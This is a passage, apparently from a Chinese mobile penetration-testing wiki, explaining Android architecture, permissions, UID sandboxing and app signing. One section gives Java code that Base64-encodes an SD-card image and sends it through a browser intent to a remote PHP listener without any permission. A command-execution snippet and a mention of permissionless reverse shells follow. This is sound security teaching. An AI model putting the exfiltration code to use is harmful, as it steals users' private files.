\u7248\u672c\uff0c\u7a0b\u5e8f\u5305\u540d\u79f0\uff0c\u6d3b\u52a8\u5217\u8868\uff08\u5e94\u7528\u7a0b\u5e8f\u53ef\u89c1\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u754c\u9762\uff09\uff0c\u670d\u52a1\uff08\u5e94\u7528\u7a0b \u5e8f\u7684\u540e\u53f0\u8fdb\u7a0b\uff09 \uff0c\u548c\u6743\u9650\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u672a\u80fd\u5728 AndroidManifest.xml \u6587\u4ef6\u4e2d\u6307\u5b9a \u6743\u9650\uff0c\u5e76\u4ecd\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u5b83\uff0c\u5219\u5e94\u7528\u7a0b\u5e8f\u5c06\u5d29\u6e83\uff0c\u5e76\u5728\u7528\u6237\u8fd0\u884c\u5b83\u65f6\u663e\u793a\u5f3a\u5236\u5173\u95ed\u6d88 \u606f\u3002 \u4e00\u4e2a\u6b63\u5e38\u7684 AndroidManifest.xml \u6587\u4ef6\u770b\u8d77\u6765\u50cf\u4e0b\u9762\u7684\u622a\u56fe\u6240\u793a\u3002 \u5728\u8fd9\u91cc\uff0c\u4f60\u53ef\u4ee5\u4f7f \u7528 \u6807\u8bb0\u548c\u5176\u4ed6\u6807\u8bb0\u67e5\u770b\u6240\u9700\u7684\u4e0d\u540c\u6743\u9650\uff1a \u5982\u524d\u6240\u8ff0\uff0c\u6240\u6709 Android \u5e94\u7528\u7a0b\u5e8f\u5728\u5b89\u88c5\u540e\u9996\u6b21\u542f\u52a8\u65f6\u90fd\u4f1a\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684 UID\u3002 \u5177\u6709\u7ed9\u5b9a UID \u7684\u6240\u6709\u7528\u6237\u90fd\u5c5e\u4e8e\u7279\u5b9a\u7ec4\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u4ed6\u4eec\u8bf7\u6c42\u7684\u6743\u9650\u3002 \u4f8b\u5982\uff0c\u4e00\u4e2a\u4ec5\u8bf7\u6c42 Internet \u6743 \u9650\u7684\u5e94\u7528\u7a0b\u5e8f\u5c06\u5c5e\u4e8e inet \u7ec4\uff0c\u56e0\u4e3a Android \u4e2d\u7684 Internet \u6743\u9650\u4f4d\u4e8e inet \u7ec4\u4e0b\u3002 \u7528\u6237\uff08\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7684\u5e94\u7528\u7a0b\u5e8f\uff09\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2a\u7ec4\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u4ed6\u4eec\u8bf7\u6c42\u7684\u6743\u9650\u3002 \u6216\u8005\u6362\u53e5 \u8bdd\u8bf4\uff0c\u6bcf\u4e2a\u7528\u6237\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2a\u7ec4\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7ec4\u53ef\u4ee5\u5177\u6709\u591a\u4e2a\u7528\u6237\u3002 \u8fd9\u4e9b\u7ec4\u5177\u6709\u7531\u7ec4 ID\uff08GID\uff09\u5b9a\u4e49\u7684\u552f\u4e00\u540d\u79f0\u3002 \u7136\u800c\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u660e\u786e\u5730\u6307\u5b9a\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u5728\u4e0e\u7b2c\u4e00\u4e2a\u76f8\u540c \u7684 UID \u4e0b\u8fd0\u884c\u3002 \u5728\u6211\u4eec\u7684\u8bbe\u5907\u4e2d\uff0c\u5176\u4e2d\u7684\u7ec4\u548c\u6743\u9650\u5728\u6587\u4ef6 platform.xml \u4e2d\u6307\u5b9a\uff0c\u5b83\u4f4d \u4e8e /system/etc/permissions/ \uff1a shell@grouper:/system/etc/permissions $ cat platform.xml . . . . . . [Some of the data has been stripped from here in order to shorten the output an d make it readable] \u6b64\u5916\uff0c\u8fd9\u6e05\u9664\u4e86\u5bf9\u5728 Android \u8bbe\u5907\u4e2d\u8fd0\u884c\u7684\u672c\u5730\u5e94\u7528\u7a0b\u5e8f\u7684\u6000\u7591\u3002 \u7531\u4e8e\u672c\u5730\u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u4e0e \u5904\u7406\u5668\u4ea4\u4e92\uff0c\u800c\u4e0d\u662f\u5728 Dalvik \u865a\u62df\u673a\u4e0b\u8fd0\u884c\uff0c\u56e0\u6b64\u5b83\u4e0d\u4f1a\u4ee5\u4efb\u4f55\u65b9\u5f0f\u5f71\u54cd\u6574\u4f53\u5b89\u5168\u6a21\u578b\u3002 \u73b0\u5728\uff0c\u5c31\u50cf\u6211\u4eec\u5728\u524d\u9762\u90e8\u5206\u770b\u5230\u7684\uff0c\u5e94\u7528\u7a0b\u5e8f\u5c06\u5176\u6570\u636e\u5b58\u50a8 \u5728 location/data/data/[package name] \u3002 \u73b0\u5728\uff0c\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u7684\u6240\u6709\u6587\u4ef6\u5939\u4e5f\u5177\u6709\u76f8\u540c \u7684\u7528\u6237 ID\uff0c\u8fd9\u6784\u6210 Android \u5b89\u5168\u6a21\u578b\u7684\u57fa\u7840\u3002 \u6839\u636e UID \u548c\u6587\u4ef6\u6743\u9650\uff0c\u5b83\u5c06\u9650\u5236\u6765\u81ea\u5177\u6709\u4e0d\u540c UID \u7684\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u5bf9\u5b83\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u3002 \u5728\u4e0b\u9762\u7684\u4ee3\u7801\u793a\u4f8b\u4e2d\uff0c ret \u5305\u542b\u4ee5 Base64 \u683c\u5f0f\u7f16\u7801\u5b58\u50a8\u5728\u7684 SD \u5361\u4e2d\u7684\u56fe\u50cf\uff0c\u73b0\u5728\u6b63\u5728\u4f7f \u7528\u6d4f\u89c8\u5668\u8c03\u7528\u6765\u4e0a\u4f20\u5230 attify.com \u7f51\u7ad9\u3002 \u76ee\u7684\u53ea\u662f\u627e\u5230\u4e00\u79cd\u65b9\u5f0f\u6765\u5728\u4e24\u4e2a\u4e0d\u540c\u7684 Android \u5bf9 \u8c61\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002 \u6211\u4eec\u5c06\u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u6765\u5b58\u50a8\u56fe\u50cf\uff0c\u5728 Base64 \u4e2d\u7f16\u7801\uff0c\u6700\u540e\u5c06\u5176\u5b58\u50a8\u5728\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d imageString \uff1a final File file = new File(\"/mnt/sdcard/profile.jpg\"); Uri uri = Uri.fromFile(file); ContentResolver cr = getContentResolver(); Bitmap bMap=null; try { InputStream is = cr.openInputStream(uri); bMap = BitmapFactory.decodeStream(is); if (is != null) { is.close(); } } catch (Exception e) { Log.e(\"Error reading file\", e.toString()); } ByteArrayOutputStream baos = new ByteArrayOutputStream(); bMap.compress(Bitmap.CompressFormat.JPEG, 100, baos); byte[] b = baos.toByteArray(); String imageString = Base64.encodeToString(b,Base64.DEFAULT); \u6700\u540e\uff0c\u6211\u4eec\u5c06\u542f\u52a8\u6d4f\u89c8\u5668\u5c06\u6570\u636e\u53d1\u9001\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\uff0c\u6211\u4eec\u6709\u4e00\u4e2a .php \u6587\u4ef6\u4fa6\u542c\u4f20\u5165\u7684\u6570 \u636e\uff1a startActivity(new Intent(Intent.ACTION_VIEW,Uri.parse(\" http://attify.com/up.php?u=\"+im ageString))); \u6211\u4eec\u8fd8\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u5e76\u4ee5\u76f8\u540c\u7684\u65b9\u5f0f\u5c06\u8f93\u51fa\u53d1\u9001\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u3002 \u4f46\u662f\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9 \u662f shell \u5e94\u8be5\u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u7528\u6237\u4e0b\u8fd0\u884c\uff1a // To execute commands : String str = \"cat /proc/version\"; //command to be executed is stored in str. process = Runtime.getRuntime().exec(str); \u8fd9\u662f\u4e00\u4e2a\u6709\u8da3\u7684\u73b0\u8c61\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u53cd\u5411 shell\uff08\u8fd9\u662f\u4e00\u4e2a\u4ece\u8bbe\u5907\u5230\u7cfb\u7edf\u7684\u53cc\u5411\u8fde \u63a5\uff0c\u53ef\u4ee5\u7528\u4e8e\u6267\u884c\u547d\u4ee4\uff09\uff0c\u800c\u4e0d\u9700\u8981\u4efb\u4f55\u7c7b\u578b\u7684\u6743\u9650\u3002 1.4 \u5e94\u7528\u7b7e\u540d \u00b6 \u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u662f Android \u7684\u72ec\u7279\u7279\u6027\u4e4b\u4e00\uff0c\u7531\u4e8e\u5176\u5f00\u653e\u6027\u548c\u5f00\u53d1\u4eba\u5458\u793e\u533a\uff0c\u5b83\u53d6\u5f97\u4e86\u6210\u529f\u3002 Play \u5546\u5e97\u4e2d\u6709\u8d85\u8fc7\u4e00\u767e\u4e07\u4e2a\u5e94\u7528\u3002 \u5728 Android \u4e2d\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u901a\u8fc7\u4e0b\u8f7d Android SDK \u521b\u5efa Android \u5e94\u7528\uff0c\u7136\u540e\u5c06\u5176\u53d1\u5e03\u5230 Play \u5546\u5e97\u3002 \u901a\u5e38\u6709\u4e24\u79cd\u7c7b\u578b\u7684\u8bc1\u4e66\u7b7e\u540d\u673a\u5236\u3002 \u4e00\u4e2a\u662f\u7531\u7ba1\u7406 \u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u7b7e\u540d\u7684\uff0c\u53e6\u4e00\u4e2a\u662f\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002 \u6ca1\u6709\u4e2d\u95f4\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\uff0c\u800c\u5f00 \u53d1\u4eba\u5458\u53ef\u4ee5\u521b\u5efa\u81ea\u5df1\u7684\u8bc1\u4e66\u5e76\u4e3a\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u3002 \u5728 Apple \u7684 iOS \u5e94\u7528\u7a0b\u5e8f\u6a21\u578b\u4e2d\u53ef\u4ee5\u770b\u5230 CA \u7b7e\u540d\uff0c\u5176\u4e2d\u5f00\u53d1\u8005\u4e0a\u4f20\u5230 App Store \u7684\u6bcf\u4e2a\u5e94 \u7528\u7a0b\u5e8f\u90fd\u7ecf\u8fc7\u9a8c\u8bc1\uff0c\u7136\u540e\u7531 Apple \u7684\u8bc1\u4e66\u7b7e\u540d\u3002 \u4e00\u65e6\u4e0b\u8f7d\u5230\u8bbe\u5907\uff0c\u8bbe\u5907\u5c06\u9a8c\u8bc1\u5e94\u7528\u7a0b\u5e8f\u662f\u5426 \u7531 Apple \u7684 CA \u7b7e\u540d\uff0c\u7136\u540e\u624d\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u3002","title":"App\u79fb\u52a8\u6e17\u900f\u6d4b\u8bd5"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#android","text":"","title":"\u7b2c\u4e00\u7ae0 Android"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#11-android","text":"Android \u7531\u56db\u4e2a\u5c42\u7ec4\u6210\uff1aLinux \u5185\u6838\uff0c\u672c\u5730\u7528\u6237\u7a7a\u95f4\uff0c\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u548c\u5e94\u7528\u7a0b\u5e8f\u5c42\u3002\u6709\u65f6\u672c\u5730\u7528\u6237\u7a7a\u95f4\u548c\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42\u88ab\u5408\u5e76\u5230\u4e00\u4e2a\u5c42\u4e2d\uff0c\u79f0\u4e3a Android \u4e2d\u95f4\u4ef6\u5c42 Linux \u5185\u6838\u5c42 \u3002\u5728 Android \u4e2d\uff0cLinux \u5185\u6838\u8d1f\u8d23\u8fdb\u7a0b\uff0c\u5185\u5b58\uff0c\u901a\u4fe1\uff0c\u6587\u4ef6\u7cfb\u7edf\u7ba1\u7406\u7b49\u3002\u867d\u7136 Android \u4e3b\u8981\u4f9d\u8d56\u4e8e\u201cvanilla\" Linux \u5185\u6838\u529f\u80fd\uff0c\u4f46\u662f\u5df2\u7ecf\u505a\u51fa\u4e86\u7cfb\u7edf\u64cd\u4f5c\u6240\u9700\u7684\u51e0\u4e2a\u81ea\u5b9a\u4e49\u66f4\u6539\u3002\u5176\u4e2d Binder\uff08\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u5bf9Android \u4e2d\u7684\u81ea\u5b9a\u4e49 RPC / IPC \u673a\u5236\u7684\u652f\u6301\uff09\uff0cAshmem\uff08\u66ff\u4ee3\u6807\u51c6\u7684 Linux \u5171\u4eab\u5185\u5b58\u529f\u80fd\uff09\uff0cWakelocks\uff08\u4e00\u79cd\u9632\u6b62\u7cfb\u7edf\u8fdb\u5165\u7761\u7720\u7684\u673a\u5236\uff09\u662f\u6700\u503c\u5f97\u6ce8\u610f\u7684\u66f4\u6539\u3002\u867d\u7136\u8fd9\u4e9b\u53d8\u5316\u88ab\u8bc1\u660e\u5728\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u975e\u5e38\u6709\u7528\uff0c\u4f46\u5b83\u4eec\u4ecd\u7136\u5728 Linux \u5185\u6838\u7684\u4e3b\u8981\u5206\u652f\u4e4b\u5916\u3002 \u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42 \u3002\u901a\u8fc7\u672c\u5730\u7528\u6237\u7a7a\u95f4\uff0c\u6211\u4eec\u53ef\u4e86\u89e3\u5728 Dalvik \u865a\u62df\u673a\u4e4b\u5916\u8fd0\u884c\u7684\u6240\u6709\u7528\u6237\u7a7a\u95f4\u7ec4\u4ef6\uff0c\u5e76\u4e14\u4e0d\u5c5e\u4e8e Linux Kernel \u5c42\u3002\u8fd9\u4e2a\u5c42\u7684\u7b2c\u4e00\u4e2a\u7ec4\u4ef6\u662f\u786c\u4ef6\u62bd\u8c61\u5c42\uff08HAL\uff09\uff0c\u5b83\u4e0e Linux\u5185\u6838\u548c\u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42\u4e4b\u95f4\u5b9e\u9645\u4e0a\u662f\u6a21\u7cca\u7684\u3002\u5728 Linux \u4e2d\uff0c\u786c\u4ef6\u9a71\u52a8\u7a0b\u5e8f\u5d4c\u5165\u5230\u5185\u6838\u4e2d\u6216\u4f5c\u4e3a\u6a21\u5757\u52a8\u6001\u52a0\u8f7d\u3002\u867d\u7136 Android \u662f\u5efa\u7acb\u5728 Linux \u5185\u6838\u4e4b\u4e0a\uff0c\u5b83\u5229\u7528\u4e86\u4e00\u79cd\u975e\u5e38\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u652f\u6301\u65b0\u7684\u786c\u4ef6\u3002\u76f8\u53cd\uff0c\u5bf9\u4e8e\u6bcf\u79cd\u7c7b\u578b\u7684\u786c\u4ef6\uff0cAndroid \u5b9a\u4e49\u4e86\u4e00\u4e2a API\uff0c\u5b83\u7531\u4e0a\u5c42\u4f7f\u7528\u5e76\u4e0e\u8fd9\u79cd\u7c7b\u578b\u7684\u786c\u4ef6\u4ea4\u4e92\u3002\u786c\u4ef6\u4f9b\u5e94\u5546\u5fc5\u987b\u63d0\u4f9b\u4e00\u4e2a\u8f6f\u4ef6\u6a21\u5757\uff0c\u8d1f\u8d23\u5b9e\u73b0\u5728 Android \u4e2d\u4e3a\u8fd9\u79cd\u7279\u5b9a\u7c7b\u578b\u7684\u786c\u4ef6\u5b9a\u4e49\u7684API\u3002\u56e0\u6b64\uff0c\u6b64\u89e3\u51b3\u65b9\u6848\u4e0d\u518d\u5141\u8bb8 Android \u5c06\u6240\u6709\u53ef\u80fd\u7684\u9a71\u52a8\u7a0b\u5e8f\u5d4c\u5165\u5185\u6838\uff0c\u5e76\u7981\u7528\u52a8\u6001\u6a21\u5757\u52a0\u8f7d\u5185\u6838\u673a\u5236\u3002\u63d0\u4f9b\u6b64\u529f\u80fd\u7684\u7ec4\u4ef6\u5728 Android \u4e2d\u79f0\u4e3a\u786c\u4ef6\u62bd\u8c61\u5c42\u3002\u6b64\u5916\uff0c\u8fd9\u6837\u7684\u67b6\u6784\u89e3\u51b3\u65b9\u6848\u5141\u8bb8\u786c\u4ef6\u4f9b\u5e94\u5546\u9009\u62e9\u8bb8\u53ef\u8bc1\uff0c\u5728\u5176\u4e0b\u5206\u53d1\u5b83\u4eec\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002 \u5185\u6838\u901a\u8fc7\u542f\u52a8\u4e00\u4e2a\u540d\u4e3a init \u7684\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b\u6765\u5b8c\u6210\u5176\u542f\u52a8\u3002 \u6b64\u8fc7\u7a0b\u8d1f\u8d23\u542f\u52a8 Android \u4e2d\u7684\u6240\u6709\u5176\u4ed6\u8fdb\u7a0b\u548c\u670d\u52a1\uff0c\u4ee5\u53ca\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u5173\u952e\u670d\u52a1\u5728 Android \u4e2d\u505c\u6b62\u5e94\u7b54\uff0cinit \u8fdb\u7a0b\u53ef\u4ee5\u91cd\u65b0\u542f\u52a8\u5b83\u3002 \u8be5\u8fdb\u7a0b\u6839\u636e init.rc \u914d\u7f6e\u6587\u4ef6\u6267\u884c\u64cd\u4f5c\u3002 \u5de5\u5177\u7bb1\u5305\u62ec\u57fa\u672c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5728 Android [19]\u4e2d\u63d0\u4f9b shell \u5de5\u5177\u7684\u529f\u80fd\u3002 Android \u8fd8\u4f9d\u8d56\u4e8e\u4e00\u4e9b\u5173\u952e\u7684\u5b88\u62a4\u8fdb\u7a0b\u3002 \u5b83\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u542f\u52a8\uff0c\u5e76\u5728\u7cfb\u7edf\u5de5\u4f5c\u65f6\u4fdd\u6301\u5b83\u4eec\u8fd0\u884c\u3002 \u4f8b\u5982\uff0c rild \uff08\u65e0\u7ebf\u63a5\u53e3\u5c42\u5b88\u62a4\u8fdb\u7a0b\uff0c\u8d1f\u8d23\u57fa\u5e26\u5904\u7406\u5668\u548c\u5176\u4ed6\u7cfb\u7edf\u4e4b\u95f4\u7684\u901a\u4fe1\uff09\uff0c servicemanager \uff08\u4e00\u4e2a\u5b88\u62a4\u8fdb\u7a0b\uff0c\u5b83\u5305\u542b\u5728 Android \u4e2d\u8fd0\u884c\u7684\u6240\u6709 Binder \u670d\u52a1\u7684\u7d22\u5f15\uff09\uff0c adbd \uff08Android Debug Bridge \u5b88\u62a4\u8fdb\u7a0b\uff0c\u4f5c\u4e3a\u4e3b\u673a\u548c\u76ee\u6807\u8bbe\u5907\u4e4b\u95f4\u7684\u8fde\u63a5\u7ba1\u7406\u5668\uff09\u7b49\u3002 \u672c\u5730\u7528\u6237\u7a7a\u95f4\u4e2d\u6700\u540e\u4e00\u4e2a\u7ec4\u4ef6\u662f\u672c\u5730\u5e93\u3002 \u6709\u4e24\u79cd\u7c7b\u578b\u7684\u672c\u5730\u5e93\uff1a\u6765\u81ea\u5916\u90e8\u9879\u76ee\u7684\u672c\u5730\u5e93\uff0c\u4ee5\u53ca\u5728 Android \u81ea\u8eab\u4e2d\u5f00\u53d1\u7684\u672c\u5730\u5e93\u3002 \u8fd9\u4e9b\u5e93\u88ab\u52a8\u6001\u52a0\u8f7d\u5e76\u4e3a Android \u8fdb\u7a0b\u63d0\u4f9b\u5404\u79cd\u529f\u80fd\u3002 \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42 \u3002 Dalvik \u662f Android \u7684\u57fa\u4e8e\u5bc4\u5b58\u5668\u7684\u865a\u62df\u673a\u3002\u5b83\u5141\u8bb8\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u4f7f\u7528 Java\u8bed\u8a00\u7f16\u5199\u7684 Android \u5e94\u7528\u7a0b\u5e8f\u3002\u5728\u6784\u5efa\u8fc7\u7a0b\u4e2d\uff0cJava \u7c7b\u88ab\u7f16\u8bd1\u6210\u7531 Dalvik VM \u89e3\u91ca\u7684 .dex \u6587\u4ef6\u3002 Dalvik VM \u7279\u522b\u8bbe\u8ba1\u4e3a\u5728\u53d7\u9650\u73af\u5883\u4e2d\u8fd0\u884c\u3002\u6b64\u5916\uff0cDalvik VM \u63d0\u4f9b\u4e86\u4e0e\u7cfb\u7edf\u5176\u4f59\u90e8\u5206\u4ea4\u4e92\u7684\u529f\u80fd\uff0c\u5305\u62ec\u672c\u5730\u4e8c\u8fdb\u5236\u548c\u5e93\u3002\u4e3a\u4e86\u52a0\u901f\u8fdb\u7a0b\u521d\u59cb\u5316\u8fc7\u7a0b\uff0cAndroid \u5229\u7528\u4e86\u4e00\u4e2a\u540d\u4e3a Zygote \u7684\u7279\u5b9a\u7ec4\u4ef6\u3002\u8fd9\u662f\u4e00\u4e2a\u5c06\u6240\u6709\u6838\u5fc3\u5e93\u94fe\u63a5\u8d77\u6765\u7684\u7279\u6b8a\u201c\u9884\u70ed\"\u8fc7\u7a0b\u3002\u5f53\u65b0\u5e94\u7528\u7a0b\u5e8f\u5373\u5c06\u8fd0\u884c\u65f6\uff0cAndroid \u4f1a\u4ece Zygote \u5206\u914d\u4e00\u4e2a\u65b0\u8fdb\u7a0b\uff0c\u5e76\u6839\u636e\u5df2\u542f\u52a8\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u89c4\u8303\u8bbe\u7f6e\u8be5\u8fdb\u7a0b\u7684\u53c2\u6570\u3002\u8be5\u89e3\u51b3\u65b9\u6848\u5141\u8bb8\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u5c06\u94fe\u63a5\u5e93\u590d\u5236\u5230\u65b0\u8fdb\u7a0b\u4e2d\uff0c\u4ece\u800c\u52a0\u5feb\u5e94\u7528\u7a0b\u5e8f\u542f\u52a8\u64cd\u4f5c\u3002\u5728 Android \u4e2d\u4f7f\u7528\u7684 Java \u6838\u5fc3\u5e93\uff0c\u662f\u4ece Apache Harmony \u9879\u76ee\u501f\u7528\u7684\u3002 \u7cfb\u7edf\u670d\u52a1\u662f Android \u7684\u6700\u91cd\u8981\u7684\u90e8\u5206\u4e4b\u4e00\u3002 Android \u63d0\u4f9b\u4e86\u8bb8\u591a\u7cfb\u7edf\u670d\u52a1\uff0c\u5b83\u4eec\u63d0\u4f9b\u4e86\u57fa\u672c\u7684\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\u529f\u80fd\uff0c\u4f9b Android \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u5728\u5176\u5e94\u7528\u4e2d\u4f7f\u7528\u3002 \u4f8b \u5982\uff0c PackageManagerService \u8d1f\u8d23\u7ba1\u7406\uff08\u5b89\u88c5\uff0c\u66f4\u65b0\uff0c\u5220\u9664\u7b49\uff09\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684 Android \u5305\u3002 \u4f7f\u7528 JNI \u63a5\u53e3\u7cfb\u7edf\u670d\u52a1\u53ef\u4ee5\u4e0e\u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42\u7684\u5b88\u62a4\u8fdb\u7a0b\uff0c\u5de5\u5177\u7bb1\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u672c\u5730\u5e93\u8fdb\u884c\u4ea4\u4e92\u3002 \u516c\u5171 API \u5230\u7cfb\u7edf\u670d\u52a1\u90fd\u662f\u901a\u8fc7 Android \u6846\u67b6\u5e93\u63d0\u4f9b\u7684\u3002 \u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u6b64 API \u4e0e\u7cfb\u7edf\u670d\u52a1\u8fdb\u884c\u4ea4\u4e92\u3002 Android \u5e94\u7528\u7a0b\u5e8f\u5c42 \u3002 Android \u5e94\u7528\u7a0b\u5e8f\u662f\u5728 Android \u4e0a\u8fd0\u884c\u7684\u8f6f\u4ef6\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e3a\u7528\u6237\u63d0\u4f9b\u5927\u591a\u6570\u529f\u80fd\u3002 Stock Android \u64cd\u4f5c\u7cfb\u7edf\u9644\u5e26\u4e86\u4e00\u4e9b\u79f0\u4e3a\u7cfb\u7edf\u5e94\u7528\u7a0b\u5e8f\u7684\u5185\u7f6e\u5e94\u7528\u7a0b\u5e8f\u3002 \u8fd9\u4e9b\u662f\u4f5c\u4e3a AOSP \u6784\u5efa\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\u7f16\u8bd1\u7684\u5e94\u7528\u7a0b\u5e8f\u3002 \u6b64\u5916\uff0c\u7528\u6237\u53ef\u4ee5\u4ece\u8bb8\u591a\u5e94\u7528\u5e02\u573a\u5b89\u88c5\u7528\u6237\u5e94\u7528\uff0c\u6765\u6269\u5c55\u57fa\u672c\u529f\u80fd\u5e76\u5411\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5165\u65b0\u7684\u529f\u80fd\u3002","title":"1.1 Android \u6280\u672f\u6808"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#12-android","text":"Android \u7684\u6838\u5fc3\u5b89\u5168\u539f\u5219\u662f\uff0c\u5bf9\u624b\u5e94\u7528\u7a0b\u5e8f\u4e0d\u5e94\u8be5\u635f\u5bb3\u64cd\u4f5c\u7cfb\u7edf\u8d44\u6e90\uff0c\u7528\u6237\u548c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002 \u4e3a\u4e86\u4fc3\u4f7f\u8fd9\u4e2a\u539f\u5219\u7684\u6267\u884c\uff0cAndroid \u662f\u4e00\u4e2a\u5206\u5c42\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5229\u7528\u4e86\u6240\u6709\u7ea7\u522b\u63d0\u4f9b\u7684\u5b89\u5168\u673a\u5236\u3002 \u4e13\u6ce8\u4e8e\u5b89\u5168\u6027\uff0cAndroid \u7ed3\u5408\u4e86\u4e24\u4e2a\u5c42\u7ea7\u7684\u7ec4\u4ef6Linux \u5185\u6838\u5c42\u548c\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42 \u5728 Linux \u5185\u6838\u5c42\u7ea7 \uff0c\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u7279\u6b8a\u7684\u5e94\u7528\u7a0b\u5e8f\u6c99\u7bb1\u4e2d\u8fd0\u884c\u3002 \u5185\u6838\u901a\u8fc7\u4f7f\u7528\u6807\u51c6 Linux\u8bbe\u65bd\uff08\u8fdb\u7a0b\u5206\u79bb\uff0c\u4ee5\u53ca\u901a\u8fc7\u7f51\u7edc\u5957\u63a5\u5b57\u548c\u6587\u4ef6\u7cfb\u7edf\u7684\u4efb\u610f\u8bbf\u95ee\u63a7\u5236\uff09\u6765\u5f3a\u5236\u9694\u79bb\u5e94\u7528\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u7ec4\u4ef6\u3002 \u8fd9\u79cd\u9694\u79bb\u7684\u5b9e\u73b0\u662f\uff0c\u4e3a\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5206\u914d\u5355\u72ec\u7684 Unix \u7528\u6237\uff08UID\uff09\u548c\u7ec4\uff08GID\uff09\u6807\u8bc6\u7b26\u3002 \u8fd9\u79cd\u67b6\u6784\u51b3\u7b56\u5f3a\u5236\u5728\u5355\u72ec\u7684 Linux \u8fdb\u7a0b\u4e2d\u8fd0\u884c\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u3002 \u56e0\u6b64\uff0c\u7531\u4e8e\u5728 Linux \u4e2d\u5b9e\u73b0\u7684\u8fdb\u7a0b\u9694\u79bb\uff0c\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e0d\u80fd\u76f8\u4e92\u5e72\u6270\uff0c\u5e76\u4e14\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u8bbe\u65bd\u5177\u6709\u6709\u9650\u7684\u8bbf\u95ee\u3002 \u56e0\u6b64\uff0c\u5e94\u7528\u7a0b\u5e8f\u6c99\u76d2\u786e\u4fdd\u5e94\u7528\u7a0b\u5e8f\u4e0d\u80fd\u8017\u5c3d\u64cd\u4f5c\u7cfb\u7edf\u8d44\u6e90\uff0c\u5e76\u4e14\u4e0d\u80fd\u4e0e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92\u3002 Linux 